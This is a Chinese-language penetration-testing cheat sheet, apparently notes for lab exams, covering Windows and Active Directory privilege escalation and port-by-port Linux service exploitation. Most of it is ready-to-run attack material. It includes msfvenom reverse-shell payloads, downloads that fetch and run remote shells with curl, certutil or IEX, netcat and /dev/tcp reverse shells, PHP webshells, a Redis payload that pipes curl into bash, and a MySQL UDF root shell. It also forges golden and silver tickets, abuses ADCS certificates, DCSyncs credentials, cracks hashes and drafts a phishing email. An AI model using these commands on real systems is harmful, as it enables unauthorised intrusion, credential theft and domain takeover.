PS: reg save hklm\system c:\temp\system

# 需提前建立/temp文件夹

# 或使用reg save hklm\system system

ps: downloads system

# 复制到可以下载的地方

kali: impacket-secretsdump -system system -ntds ntds.dit local

# 后续和上面一样evil登录

# 同时也可以获得krbtgt的nthash等一系列的黄金票据提权所要用到的信息

```

5. 服务提权，首先使用`sc qc mysql`，这种的方式查询某个服务的详细配置信息，接下来根据`BINARY_PATH_NAME`查询用于查看和修改文件/文件夹NTFS权限的命令

```bash

icacls E:\mysql\bin\mysql.exe

#权限级别说明

- F - 完全控制

- M - 修改  

- RX - 读取和执行

- R - 只读

- W - 只写

- D - 删除

```

```bash

#提权步骤

5.1.生成反弹shell

msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe

5.2.上传文件（msf中执行）

upload shell.exe

5.3.修改服务binPath

sc.exe config vss binPath="C:\path\to\shell.exe"

# road是你shell.exe下载到的路径

5.4.重启服务（需要有Server Operators权限）

sc.exe stop vss

sc.exe start vss

# 备选方案：通过重启提权

如果有关机权限，可以替换系统文件后重启：

5.1.rename bd.exe bd.exe.bak

# move bd.exe bd.exe.bak

5.2.curl http://ip:port/shell.exe -o bd.exe

5.3.copy C:\xampp\htdocs\reverse.exe bd.exef

5.4.shutdown /r /t 0

```

6. 后续可以修改文件，如果有重启权限就重启，大多数情况下没有，但都有开机重启，这个时候我们重新开机即可。

7. 自动枚举服务，使用`powerUP.ps1`文件，然后`Get-modifiableServiceFile`查看可能存在的问题服务。

8. msi提权，使用命令

```bash

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 如果这个是0x1，就可以使用msi安装包提权。

msfvenom -p windows/shell_reverse_tcp lhost=ip lport=port -f msi > shell.msi

# 生成msi反弹文件

cd \Users\Public\Downloads

curl http://ip:port/shell.msi -o shell.msi

# 下载文件

msiexec /quiet /i shell.msi

# 反弹shell

```

9. sql-server提权，详细看

```bash

https://blog.csdn.net/m0_64481831/article/details/137070646?ops_request_misc=elastic_search_misc&request_id=5f57b46ab01af65dd47d5a045873063d&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-137070646-null-null.142^v102^pc_search_result_base5&utm_term=sql-server%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187

```

10. putty信息泄露，使用`reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions"`查看信息，或许有administrator等用户的密码。

11. kdbx文件信息，找到后缀为.kdbx文件，传到Linux中

```bash

python -m SimpleHTTPServer 80

#开启临时web服务  大概率报错，使用scp

# scp gill@192.168.205.142:/home/gill/key* /root

kali: impacket-smbserver test . -smb2support -username kali -password kali

PS: net use m: \\<你的Linux IP>\test /user:kali kali

PS: copy secret.txt m:\

# 这里的secret.txt是你要传出来的文件

keepass2john keyfile.kdbx > Keepasshash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt

https://app.keeweb.info/

# 直接将文件导入到里面，输入密码，查看密码

```

12. `net group`查看域的组，`local group`查看本地的组

13. 添加用户，DCSync权限

```bash

net group/localgroup

# 查看域/本地的组

net user username password /add /域名

# example: net user abc abc123 /add /domain

# username和password都是你自己设置，域名需要自己分析,密码不能太简单

net group/localgroup "组名" /add abc

# example: net group "Exchange Windows Permissions" abc /add

# 查看是否对某个组有完全操作权限，将用户添加进去

uploads PowerView.ps1

. .\powerview.ps1

$SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force

# example: $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force，password是你自己设置的密码

$Cred = New-Object System.Management.Automation.PSCredential('dc\name', $SecPassword)

# example: $Cred = New-Object System.Management.Automation.PSCredential('htb\tester', $SecPassword),dc是域名，name是自己设置的名字

# Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity name -Rights DCSync

# Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tester -Rights DCSync

# 这里的dc是ad域名，而name是之前设置名字

Add-ObjectACl -PrincipalIdentity tester -Credential $cred -Rights DCSync

```

14. `net user username`查看用户权限

15. 上传文件命令`wget "http://192.168.245.153/HiveNightmare.exe" -outfile "c:\pwn\HiveNightmare.exe"`可以下载到\pwn目录下

16. 端口转发提权

```bash

netstat -anto

# 查找只有本地访问端口，可以使用 | findstr 参数筛选

# 接下来使用chisel.exe（先下载）windowstool/chisel.exe

curl http://ip/port/chisel.exe -o chisel.exe

# 先使用curl下载，如果不行使用certutil下载

certutil -split -f -urlcache http://ip/port/chisel.exe

# /linuxtool/chisel_1.9.1_linux_amd64

kali: ./chisel_1.9.1_linux_amd64 server -p port --reverse

# example: ./chisel server -p 9999 --reverse

PS: cmd /c .\chisel.exe client ip:port R:要转发发端口:host:要转发的端口

# example: start /b chisel.exe client 10.10.16.24:9999 R:8888:127.0.0.1:8888

# 二者的端口要一致，同时要搞清楚端口运行什么，接下来就可以访问8888端口了

# 这里的ip是你的kali ip，同时转发的端口不能和前面的port重合

或者PS: .\chisel.exe client ip:port R:socks

# example: .\chisel.exe client 10.10.16.12:7080 R:socks

```

17. 使用`net user username`查看`global group`,如果属于\*LAPS\_Readers组,使用LAPS提权。

```bash

git clone https://github.com/ztrhgf/LAPS.git # 下载LAPS

PS: upload ./LAPS/AdmPwd.PS #上传

PS: Import-Module .\AdmPwd.PS\AdmPwd.PS.psd1 # 上传

PS: Find-AdmPwdExtendedRights -identity *

PS: get-admpwdpassword -computername dc01 | Select password

# dc01是你的域名（未知真假），获得密码

# kali: nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --module laps

# example: nxc ldap "10.129.254.42" -d "timelapse.htb" -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps

kali: evil-winrm -i ip -u administrator -p 'password' -S

# password是你找到的密码

```

18. 对于`Program Files/Program Files（x86）/\ProgramData\PY_Software`文件夹因该重点关注

19. 输入`dir /a`报错，可能是环境问题，输入`cmd /c dir /a`可以执行

20. dns攻击（dll劫持提权方法二）

```bash

net user username

# Contractors，可以进行dns攻击

responder -I tun0

# 开启smb服务，或者下面这个也行

impacket-smbserver share ./

# 二选一，不过下面这个似乎更好

msfvenom windows/x64/exec cmd='net administrator password /domain' -f dll > shell.dll

# 使用这个命令可以使得administrator的域用户密码变为password（自己设置）

cmd /c dnscmd localhost /config /serverlevelplugindll \\ip\share\shell.dll

# 攻击和部署DNS插件后门

sc.exe stop dns

sc.exe start dns

# 没有执行就多执行几次

```

21. 白银票据攻击

```bash

Get-LocalUser -Name $env:USERNAME | Select sid

# nltest /domain_trusts /v

# 获取sid

impacket-ticketer -nthash pass -domain-sid sid -domain ad -dc-ip dc.ad -spn nonexistent/DC.AD -user-id 500 Adminisrator

# 白银票据攻击中的pass是你的password的加密后的hash值，加密地址：https://codebeautify.org/ntlm-hash-generator,sid是你上面获取的sid(去掉最后的数字)，ad是你的域名，后面的是要dc.域名，后面的DC.AD也是如此

Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames

# svc_mssql是用户，获取spn

# example: impacket-ticketer -nthash 143sdggSF -domain-sid S-1-5-21-4078382237-1492182817-2568127209(去掉了最后的-1106) -domain seq.htb -dc-ip dc.seq.htb -spn nonexistent/DC.SEQ.HTB Adminirtrator

# impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator

# 最后会生成一个Adminstrator.ccahe文件

export KRB5CCNAME=$PWD/Administrator.ccahe

# 如果票据在当前目录

# 添加到环境变量中

klist

impacket-mssqlclient -k dc.ad

# dc.ad是你的dc域名

# example: impacket-mssqlclient -k nagoya.nagoya-industries.com

select SYSTEM_USER

# 因该是administrator权限

SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\proof.txt',SINGLE_CLOB) AS Contents

# 读取root.txt,也可以用同样的方法读local.txt

enable_xp_cmdshell

xp_cmdshell whoami

# 执行命令

```

22. 黄金票据提权（父子域跨域提权）

```bash

nltest /domain_trusts /v

# 获取子域的sid和父域的sid

net localgroup administrators testuser /add

# 将testuser加入administrators组

impacket-secretsdump jackie:Pass@123@192.168.194.162

# 一般这种情况是由子域的administrator权限，提权到父域的administrator权限，此时我们可以将某个已知账号密码的用户加入到子域管理员组中，然后获取hash

# 重点关注kerbtgt，比如下面的信息

# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::

impacket-ticketer -nthash 80f23a248d39b8cb93df3a4a2f4199a1 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991 Administrator

# 用上面获得的子域（-domain-sid）和父域（-extra-sid），-nthash则是kerbtgt后半部分

impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator

# -aesKey后面的是krbtgt的aes256-cts-hmac-sha1-96，比如下面的

# krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2

# -extra-sid是父域+‘-519’，通常519是Enterprise Admins组的RID。所以父域SID + "-519"表示父域的Enterprise Admins组。

export KRB5CCNAME=Administrator.ccache

impacket-psexec sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass

# 这里要注意父域要写入/etc/hosts，sub.poseidon和DC01.poseidon.yzx都要写

```

23. 证书伪造攻击

```bash

github下载地址: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git

PS: upload Certify.exe

# 上传文件

PS: ./Certify.exe find /vulnerable

# 如果在Template Name模块发现UserAuthentication,可以使用

kali: pip install certipy

kali: pip install certipy-ad

kali: certipy req -u name@ad -p pass -upn adminstrator@ad -target ad -dc-ip ip -ca ad-dc-ca -template UserAuthentication

# **注意**：本步骤要在python 3.9.5环境下进行

# example: certipy req -u ray@seq.htb -p asd123 -upn adminstrator@seq.htb -target seq.htb -dc-ip 10.129.239.251 -ca seq-dc-ca -template UserAuthentication

# 会生成administrator.pfx文件

kali: certipy auth -pfx adminstrator.pfx -dc-ip ip

# 提取哈希值

# [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee

# 使用后半部分，即a52后面的

kali: evil-winrm -i ip -u Adminstrator -H hash

# hash是你上面获取的hash值

```

24. wsl虚拟机提权

在信息收集过程中发现很多`Microsoft.`文件

```bash

Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $ _.PSPath} | out-string -width 4096

# 查看虚拟机信息，获取到BasePath信息

cd \path\rootfs\root

# path是你上面找到的BasePath

cat .bash_history

# 接下来就是Linux的信息

```

25. 修复会话，先使用`echo %PATH%`查看是否包含System32，没有的话使用`set PATH=%PATH%;C:\Windows\System32`修复，或`set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\system32\windowspowershell\v1.0\;`修复

26. 在.xml文件中找到加密的密码，使用如下方法解密

```bash

$encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'

# -path后是你密码文件的位置

$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password

$decryptedPassword

```

27. `scp Infrastructure.pdf kali@192.168.45.237:/home/kali/Infrastructure.pdf`回传文件

28. `rename TFTP.EXE TFTP_1.EXE`改名字，将tftp改为tftp\_1

29. AD 可以尝试 kerberoasting

```bash

# 在Ghostpack-CompiledBinaries文件夹下的Rubeus.exe

# certutil.exe -urlcache -f http://192.168.45.215/Rubeus.exe Rubeus.exe

certutil.exe -f -urlcache -split http://192.168.45.196/met_445.exe c:/windows/temp/met_445.exe

# 上传rubeus.exe文件，可以使用curl

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt

.\Rubeus.exe asreproast /nowrap

sudo hashcat -m 18200 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# 执行文件

type hashes.kerberoast # 查看文件

# 或者使用john破解

# 使用hashcat破解文件

```

30. 如果evil-winrm， impacket-psexec都无法登陆但是账号密码无误，使用Invoke-RunasCs.ps1，在RunasCs-master目录下Invoke-RunasCs.ps1

```bash

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.233 LPORT=80 -f exe>shell.exe

# 先生成反弹shell文件

python -m http.server 85

curl http://192.168.45.233:85/shell.exe -o shell.exe

curl http://192.168.45.233:85/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1

# 上传文件和反弹脚本

. .\Invoke-RunasCs.ps1

Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\Users\Public\shell.exe"

# 或者Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.118.23 4444 -e cmd.exe'

# 先启动，在反弹，这里账号密码是你找到的，反弹脚本位置自己找好，监听端口，反弹shell

# 或者直接runas /savecred /user:Administrator "shell4444.exe"

# 后续会弹出窗口输入密码

```

31. `whoami /priv`如果显示`SeManageVolumePrivilege`,可以使用SeManageVolumeExploit.exe文件提权。上传后使用即可。

32. 如果可以使用powershell，使用`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.24:8000/nishang.ps1')"`反弹shell，其中nishang.ps1是在windowstool目录下。最后一行自行修改

33. juicy-potato提权

```bash

Juicy.Potato.x86.exe  -t  * -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" #先运行这个

# 获取到-c后面的参数

Juicy.Potato.x86.exe -l 4444 -p nc.exe -a "192.168.45.201 9998 -e c:\windows\system32\cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

#然后获取到对应的值再运行这个，记得替换-c后面的参数

nc -lvp 9998 #本地开启监听

```

34. `python3 laps.py -u fmcsorley -p "CrabSharkJellyfish192" -d hutch.offsec`用ldap可能会有administrator的密码，位置在`/windowstool/LAPSDumper`

35. GenericAll权限

```bash

# 对域内普通机器有权限

net user d.chambers Pass@123 /domain

# 自己定义密码

-----------------------------------------------------------------------------------------------------------

# 如果对域管理员有权限

kali: impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.233.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'

# 先加一台新电脑,hashs是用户l.livingstone密码的hash

PS: get-adcomputer attack

kali: python3 rbcd.py -dc-ip 192.168.233.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

# 在执行rbcd.py,位于windowstool/rbcd-attack-master/rbcd.py

kali: impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.233.175

kali: export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

kali: impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.233.175

```

36.

```bash

$pw = Get-Content cred.txt | ConvertTo-SecureString

$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)

$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)

$UnsecurePassword

# windows内部密码有可能可以这样破解

```

37. `./GMSAPasswordReader.exe --accountname svc_apache`自己上传查看信息，选择rc4\_hmac的，或者全部复制枚举查看

38.

```bash

# 先上传PowerView.ps1，位于windowstool下

# 在powershell环境下执行

import-module .\powerview.ps1

Get-netuser svc_mssql

# 该账户配置了“serviceprincipalname”或 SPN。有了这些信息，我们可以发动 kerberoasting 攻击。

# 先上传Rubeus.exe

./Rubeus.exe kerberoast /nowrap

```

39. 创建调度任务来恢复权限

```bash

PS: $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""

PS: Register-ScheduledTask -Action $TaskAction -TaskName "GrantPerm"

PS: Start-ScheduledTask -TaskName "GrantPerm"

# 本地监听

```

40. `SeImpersonatePrivilege disable->enable`

```bash

PS: [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"

PS: $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs

PS: $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""

PS: Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal

PS: Start-ScheduledTask -TaskName "GrantAllPerms"

```

41. 证书伪造攻击（ESC1）

```bash

kali: source myenv/bin/activate

kali: certipy find -u 'jodie.summers' -p 'hHO_S9gff7ehXw' -dc-ip 192.168.120.30  -text -stdout -vulnerable

# 查看是否有esc1漏洞

kali: certipy req -u jodie.summers -p hHO_S9gff7ehXw -dc-ip 192.168.120.30 -ca 'NARA-CA' -template 'NaraUser' -upn 'administrator@nara-security.com'

# kali: certipy-ad req -username "TRACY.WHITE" -p "zqwj041FGX" -template NaraUser -dc-ip 192.168.167.30 -ca NARA-CA -upn 'Administrator@nara-security.com' -dns Nara.nara-security.com -debug

kali: certipy auth -pfx administrator.pfx  -u administrator -domain nara-security.com -dc-ip 192.168.120.30

kali: certipy auth -pfx administrator.pfx -dc-ip 192.168.119.30 -ldap-shell

get_user_groups jodie.summers

get_user_groups administrator

add_user_to_group jodie.summers Administrators

# 这里的Administrators是administrator获得的DC，名字是提前获得的

impacket-secretsdump nara-security.com/jodie.summers:hHO_S9gff7ehXw@192.168.120.30

# 导出hash，后登录

```

### 反弹shell

```bash

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.167/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');

CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');

# java的sql注入

```

### power shell上传文件

`powershell iwr http://192.168.45.154/nc64.exe -outfile nc64.exe`,出现警告可以多加几个\，比如一开始是,加了后变成\\

# Linux渗透测试一般流程（linux独立机）

`# 注意网页端源码`

1.  **主机发现**

`ping ip`查看是否连接

2.  使用`arp-scan -l`或`netdiscover -r`发现ip

3.  **端口扫描**

4.  **nmap扫描**

```bash

Nmap -p- -sS -A --min-rate 1000 ip

  

nmap -sC -sV -T4 ip

  

nmap -sU -top-ports=20 10.129.138.95

  

nmap -sS -sU -sC -sV -O -T4 10.10.11.136

# 扫描udp

```

### 5.  端口利用

压缩为压缩包

`zip -r -o info.php.zip info.php`

链接某个端口,`nc -nv ip port`,然后输入help查看帮助，如果有version之类的就可以查看是否有漏洞

**21**: ftp登陆，主要弱口令有FTP，ftp，anonymous，Anonymous以及靶机名字等。

`/usr/share/wordlists/legion/ftp-betterdefaultpasslist.txt`

ftp爆破密码字典

如果ftp登陆后发现无法显示，输入`passive`

可以直接使用wget下载`wget -m ftp://anonymous:anonymous@ip`下载所有文件

**22**：ssh登陆，可能会直接有信息。

1. 无法登陆加入 `-o PubkeyAcceptedAlgorithms=+ssh-rsa`，或`-o PubkeyAcceptedKeyTypes=+ssh-rsa -t '() { :;}; /bin/bash'`shellshock攻击

2. **scp**端口，需要有id\_rsa才可以继续`scp -O -i id_rsa authorized_keys max@ip:/home/max/.ssh/authorized_keys`，这里是通过id\_rsa的密钥登录，将我们的authorized\_keys传上去，然后使用id\_rsa，进行ssh登录

3. ssh出现Too many authentication failures，使用-o IdentitiesOnly=true

4. `ssh-keygen -t rsa -C 'rumenz@qq.com' -f ~/.ssh/github_id_rsa`

**25**：smtp查看

`smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.222.147`

```bash

nc -v postfish.off 25

# 使用nc链接

helo test

MAIL FROM: it@postfish.off

RCPT TO: brian.moore@postfish.off

DATA

  

Subject: Password reset process

  

Hi Brian,

  

Please follow this link to reset your password: http://192.168.49.211/                              

  

Regards,

  

.

  

QUIT

# 进行鱼叉式钓鱼攻击

# 这里ip是自己的ip

# 另一边监听80

# 注意发送方和接收方

```

25端口可能会有邮件，去`/var/mail`查看

```bash

Telnet ip 25

MAIL FROM: icepeak

RCPT TO: helios

data

<?php system($_GET['cmd']); ?>

.

QUIT

```

**53**：dns攻击端口

可能会有反向ip

`nslookup -ty=ptr 10.129.227.211 10.129.227.211`

同时在/etc/hosts写入

`dig @192.168.185.196 -x 192.168.185.196`

同样的反向ip查看，二者均为靶机ip

`dig axfr @192.168.185.196 matrimony.off`

继续查看，找到信息即可写入/etc/hosts

**80**：网页端，用浏览器查看，同时

### 注意查看网页源码

1. `dirsearch -u ip`或`dirb -u http://IP -X .txt .html .js`

查看是否有文件包含等漏洞。文件包含漏洞不只内部文件包含，比如/etc/passwd等，还有外部文件包含,比如

`http://example.com?file=http://192.168.71.128:85/shell.php`

2. `curl -v -X OPTIONS http://192.168.20.151/test`

查看是否有文件可以上传

3. `curl -v -T shell.php -H 'Expect:'http://192.168.66.130/test/`

以put的方式上传shell.php

4. Shell反弹，详见oscp

5. `'  || 'a' like 'a` sql注入

6. `wpscan --url http://192.168.55.147 -U Elliot -P fsocity.dic -t 50`

wpscan爆破,先使用`-e u`参数扫描用户，后续使用`/usr/share/wordlists/rockyou.txt`爆破用户

7. `whatweb -v ip`

8. `curl http://192.168.222.152/image.php?secrettier360=/etc/passwd|jq`在kali查看网页端内容

9. `wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.222.152/index.php?FUZZ`

Fuzz爆破模糊测试

`wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 0  --hc 404 http://192.168.2.133/index.php?page=FUZZ`

`wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.222.152/index.php?FUZZ= -H "cookie:asd" --hh 1678`

这一条命令中-H参数是cookie去网页找，--hh 1678是对于1678不要显示

10. `wpscan –url http:// -e u`（扫描用户）/ `wpscan -url http：// -e p `（扫描插件）这里需要域名而非ip地址，使用`-e ap`参数扫描是否存在漏洞。wpscan扫描插件`wpscan --update --url http://192.168.120.66/ --enumerate ap --plugins-detection aggressive`,全但是慢，建议上面的先。

11. `nikto -h 192.168.0.106:666`

nikto测试漏洞

12. burp抓包可能有信息

13. `gobuster dir -u http://192.168.106.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh `目录爆破

或者`directory-list-lowercase-2.3-medium.txt`

14. wireshark筛选

`http.request.method=="POST"`可能包含登陆信息

15. 发现cgi-bin目录可以进行扫描cgi-bin目录

16. shellshock攻击`nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=/bin/bash -i >& /dev/tcp/10.10.16.13/1234 0>&1" 10.129.24.75`

要找到可以攻击的地方

17. `dnsenum --dnsserver 10.10.10.13 cronos.htb`或者`gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u siteisup.htb>2.txt`

枚举域名

18. 在看到system菜单或console，可能会有内部命令框执行命令

19. arjun工具

```bash

python -m venv myenv

source ~/myenv/bin/active

pip install ratelimit

arjun -u http://example.com

```

20. 使用`<?php system($_GET['cmd']); ?>`时要使用

`http://example.com&cmd=ls`

21. dirsearch工具使用

```bash

dirsearch -u http://ip -e* -x 404

 # -e*：提高扫描效率，一次性检查多种文件类型（php, html, txt, json等），可以使用-e zip只输出zip文件

 # -x 404：减少输出噪音，让结果更清晰，只关注可能存在的资源

```

22. `%0a`是换行符url编码，绕过时有用

23. hydra网页端爆破时，使用

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 -s 7654 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"`

username=^USER^\&password=^PASS^\&Login=Login：POST数据字符串。这里照抄浏览器中抓到的请求负载，但用 ^USER^ 和 ^PASS^ 这两个占位符替换掉实际的用户名和密码。Login=Login 是表单中可能存在的提交按钮参数，也需要保留。

F=Login failed：失败/成功标志。F 表示查找失败时的特征字符串。如果登录失败，页面会包含“Login failed”，Hydra就会知道这次尝试没成功。也可以用 S=Success 来直接查找成功的特征

24. 注意`/var/log/access.log'`文件，如果有，使用nc ip 80，输入`GET /<?php system($_GET['cmd']); ?>`,然后进行反弹shell

**110**（solidstate）：

```bash

telnet ip 110（邮件登陆）

User admin

Pass admin（账号密码登陆）

List（查看所有邮件）

Retr 1（查看第一封邮件）

```

**113**ident端口

`ident-user-enum ip port`进行枚举， `for i in {22,113,5432,8080,10000};do ident-user-enum 192.168.214.60 ${i} ; done`

**143**

1. `hydra -L cewl.txt -P cewl.txt imap://postfish.off`利用hydra爆破账号密码

```bash

telnet target.com 143

a LOGIN username password

a LIST "" "*"

a SELECT INBOX

a FETCH 1 BODY[]

a LOGOUT

```

**161，199**：

1. `snmpwalk -v 2c -c public 10.10.11.136`

–v：指定snmp的版本, 1或者2c或者3

–c：指定连接设备SNMP密码

2.  `snmp-check ip -p 161`

扫描snmp进程信息

3. `snmp-check ip -c public`

查看clamav-milter信息

4. `hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.162.149`,爆破密码

5. `snmpwalk -v2c -c public 192.168.218.149 .1.3.6.1.4.1.8072.1.3.2`大概率会有信息

**443**：nmap -sV -T4扫描出现ssl/http考虑心脏出血漏洞

**445**:挂载方法`mount -t cifs //192.168.165.240/backup backup/ -o guest`外地backup挂载本地backup

`find backup -type f -exec grep -i -I "pass" {} /dev/null \;`查找backup下内容包含pass的那句话

**666**（temple of doom）：burp抓包查看

**873**:rsync端口

1. `rsync -av rsync://192.168.147.126/`查看文件

2. `rsync -av rsync://192.168.233.126/fox ./fox` 下载文件

3. nmap扫描查看是否有漏洞，是否可以下载文件，`nmap -p873 ip --script "rsync-list-modules" -Pn`

4. `rsync -av --list-only rsync://192.168.223.126`查看文件，只列出内容，不实际传输文件

5. `rsync -av authorized_keys rsync://ip/fox/.ssh/`上传authorized\_keys，同时如果没有.ssh文件夹会自动创建

**993**ssl端口

```bash

openssl s_client -connect target.com:993 -crlf -quiet

  

# IMAP commands

a LOGIN username password

a2 LIST "" "*"

a3 LOGOUT

```

**2049**

nfs挂载

```bash

showmount -e 192.168.71.139

mount -t nfs 192.168.71.139:/home/user5 nfs

```

如果只能localhost访问，加入`echo "192.168.49.60 localhost" >> /etc/hosts`在靶机，此处为本机ip

**3128**：ssh端口

`vim /etc/proxychains4.conf`编辑proxy文件

`http 192.168.142.145 3128`写入

`proxychains ssh john@192.168.142.145 -t "/bin/sh"`可以执行ssh

**3306**：mysql端口：

Mysql配置错误攻击

````bash

show variables like 'plugin_dir';

SHOW VARIABLES LIKE "secure_file_priv";查看信息

create table foo(line blob);

insert into foo values(load_file('/var/www/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

select * from mysql.func;

select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');

\! sh

此时我们是root权限，接下来上传nc

select do_system( 'wget http://192.168.49.246:8295/nc -O /var/www/nc');

select do_system('chmod 777 /var/www/nc');

select do_system('/var/www/nc 192.168.49.246 8295 -e /bin/bash');```

````

2. `medusa -h 192.168.120.86 -M mysql -u root -P /usr/share/wordlists/rockyou.txt -t 40 -v 4 -f`

爆破密码，比hydra快

**4555**（solidstate）：

```bash

nc 192.168.0.0 4555

Root/root（默认账号密码）

Listusers（列出所有账号名）

Setpassword user 123456（将user的密码改为123456）

```

**4655**：ssh端口，使用时使用`-p 4655`参数

**5432，5437**：postgresql端口，使用时使用命令`psql -h ip -U name -p 5437`

弱口令：`postgres/postgres`

postgresql数据库可以执行命令，使用方法如下

```bash

# -- 执行命令并将输出存储到表中

CREATE TABLE cmd_exec(result TEXT);

COPY cmd_exec FROM PROGRAM 'id;';

SELECT * FROM cmd_exec;

  

# -- 对于Windows系统

COPY cmd_exec FROM PROGRAM 'whoami';

SELECT * FROM cmd_exec;

------------------------------------------------------

select * from pg_read_file('/etc/passwd', 0, 1000000);

# 枚举信息，如果可以

```

**6379**：redis端口，查看redis是否可以使用，查看历史漏洞`redis-cli -h 192.168.192.69`，输入info查看信息，如果要输入密码，输入`AUTH password`密码是你找到的，在/etc/redis/redis.conf

```bash

root@Urahara:~# redis-cli -h 10.85.0.52

192.168.214.166:6379> config set dir /opt/redis-files

192.168.214.166:6379> config set dbfilename exe.php

192.168.214.166:6379> set test '<?php system("curl http://192.168.45.170/hack.sh | bash"); ?>'

192.168.214.166:6379> SAVE

# 可以写入php代码，然后找地方执行

```

**6667**:IRC（6667）,使用

```bash

nc -nv ip 6667

# 登录

nick kali

user kali * 0 kali

# 设置账号密码

list

# 查看有无信息

join #mailAssistant

# 加入频道

privmsg #mailAssistant hello

发送信息

# 后续根文本进行进一步攻击

# example: privmsg spaghetti_BoT !command

# privmsg spaghetti_BoT !about

  

```

**7744**：ssh端口，使用时使用`-p 7744`参数

